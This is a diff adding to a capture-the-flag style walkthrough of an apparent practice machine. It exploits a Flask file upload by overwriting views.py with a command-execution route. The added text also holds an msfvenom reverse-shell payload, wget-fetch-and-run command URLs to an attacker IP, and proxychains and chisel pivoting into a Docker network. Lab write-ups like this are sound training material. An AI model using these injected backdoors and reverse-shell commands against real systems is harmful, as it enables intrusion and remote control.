@@ -125,4 +125,98 @@ Doing this method we find a json file in .vscode with credentials
 
 ![Json with creds](../.res/2023-07-22-21-56-11.png)  
 
-## COMING SOON
+Also, we have the code for the file upload functionality in `app/app/views.py`:  
+
+```py
+import os
+
+from app.utils import get_file_name
+from flask import render_template, request, send_file
+
+from app import app
+
+
+@app.route('/', methods=['GET', 'POST'])
+def upload_file():
+    if request.method == 'POST':
+        f = request.files['file']
+        file_name = get_file_name(f.filename)
+        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
+        f.save(file_path)
+        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
+    return render_template('upload.html')
+
+
+@app.route('/uploads/<path:path>')
+def send_report(path):
+    path = get_file_name(path)
+    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
+```
+
+It seems like it does not check the type of the file and we also might be able to abuse path traversal vulnerability.  
+
+We can append the views.py code with this line  
+
+```python
+@app.route('/cmd')
+def execute():
+	return subprocess.check_output(request.args.get('cmd').split(" "))
+```
+
+We also need to import 
+
+Upload it and lively modify the request with burp as follow  
+
+![Upload](../.res/2023-07-29-20-49-49.png)
+
+So now we should have remote code execution  
+
+![RCE](../.res/2023-07-29-20-52-31.png)  
+
+Let's try to get a reverse shell with msfvenom `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.19 LPORT=4444 -f elf -o shell`
+
+Now we can serve it with `sudo python3 -m http.server 8000`
+
+We can set up a listener with msfconsole  
+
+![listerner](../.res/2023-07-29-20-58-01.png)  
+
+- `http://10.10.11.164/cmd?cmd=wget http://10.10.14.19:8000/shell`
+- `http://10.10.11.164/cmd?cmd=chmod 777 shell`
+- `http://10.10.11.164/cmd?cmd=./shell`
+
+And we get a shell  
+
+![shell](../.res/2023-07-29-21-15-16.png)  
+
+As expected we are in a docker container.  
+So we need to escape it somehow.  
+
+Let's check the internal network by setting up proxychains  
+
+![proxychains](../.res/2023-07-29-21-20-12.png)  
+
+We add this to our /etc/proxychains.conf  
+
+![proxychains](../.res/2023-07-29-21-22-11.png)  
+
+Now we need to change our routes through metasploit  
+
+![autoroutes](../.res/2023-07-29-21-26-28.png)  
+
+Now we should be able to scan the internal network  
+
+In our proxychains conf file we first need to enable quiet_mode, otherwise it is going to blur the results.  
+
+`proxychains nmap -A -v 172.17.0.1`
+
+![Nmap](../.res/2023-07-29-21-31-59.png)  
+
+Let's upload chisel in our target `upload chisel`  
+From our machine we run it as well  
+
+![chisel](../.res/2023-07-29-22-04-17.png)  
+
+- From meterpreter `execute -f /tmp/chisel -i -a "client 10.10.14.19:9999 R:3000:172.17.0.1:3000"`
+
+## coming soon
